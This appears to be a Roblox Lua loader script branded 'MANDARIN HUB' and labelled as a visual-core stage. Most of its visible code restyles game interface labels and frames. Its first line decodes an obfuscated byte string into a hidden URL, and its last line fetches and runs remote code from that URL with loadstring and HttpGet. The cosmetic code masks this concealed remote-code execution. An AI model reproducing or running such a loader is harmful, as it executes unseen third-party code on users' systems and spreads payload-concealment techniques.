
--[[ STAGE 2: VISUAL CORE ]]
local fpolJ6VOcTvDep5="\205\235\237\235\234\037\026\028\243\230\250\037\238\230\005\235\008\245\012\008\000\013\254\252\255\027\012\005\033\073\014\012\016\080\019\020\023\030\028\038\032\038\035\056\049\104\047\065\044\052\046\076\060\059\061\124\064\070\064\069\134\104\129\124\120\132\137\132\119\088\126\095\092\119\146\138\100\106\111\108\137\160\150\114\141\119\132\145\162\128\151\142\165\162\143\188\194\144\172\169\154\162\202\244\247\170\252\251\244\174\181\237\177\202\184"local t7Owr_T4wbbW2=107 local Giue_idVhH9k=183 local sFiwMxdLAKnASP7r_JnaCz=0 local xd47ZlZ5ZJrOsW0fBcJX=2 local DWLI7XBmykJmB81oCCz=17 local AvqpyuiD521GP4qdWnK=false local YbGSUqPdn7fdGw=bit32 and bit32.bxor if not YbGSUqPdn7fdGw then YbGSUqPdn7fdGw=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Ga713qURShBSyxp={}for m7VpDQ25IBd_R2q_OWJwV=1,#fpolJ6VOcTvDep5 do local QRAEABsAoA2YGCfSCz=string.byte(fpolJ6VOcTvDep5,m7VpDQ25IBd_R2q_OWJwV)local oTTmnHEMP6e9XoV=(Giue_idVhH9k+(m7VpDQ25IBd_R2q_OWJwV*xd47ZlZ5ZJrOsW0fBcJX)+DWLI7XBmykJmB81oCCz)%256 if sFiwMxdLAKnASP7r_JnaCz==0 then QRAEABsAoA2YGCfSCz=(QRAEABsAoA2YGCfSCz-oTTmnHEMP6e9XoV)%256 Ga713qURShBSyxp[m7VpDQ25IBd_R2q_OWJwV]=string.char(YbGSUqPdn7fdGw(QRAEABsAoA2YGCfSCz,t7Owr_T4wbbW2))else QRAEABsAoA2YGCfSCz=YbGSUqPdn7fdGw(QRAEABsAoA2YGCfSCz,t7Owr_T4wbbW2)Ga713qURShBSyxp[m7VpDQ25IBd_R2q_OWJwV]=string.char((QRAEABsAoA2YGCfSCz-oTTmnHEMP6e9XoV)%256)end end local Mnaw5v9rO71nlxVkB=table.concat(Ga713qURShBSyxp)if AvqpyuiD521GP4qdWnK then Mnaw5v9rO71nlxVkB=string.reverse(Mnaw5v9rO71nlxVkB)end local OOUPM7cbiJOV2qQl8W=Mnaw5v9rO71nlxVkB
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(OOUPM7cbiJOV2qQl8W))()
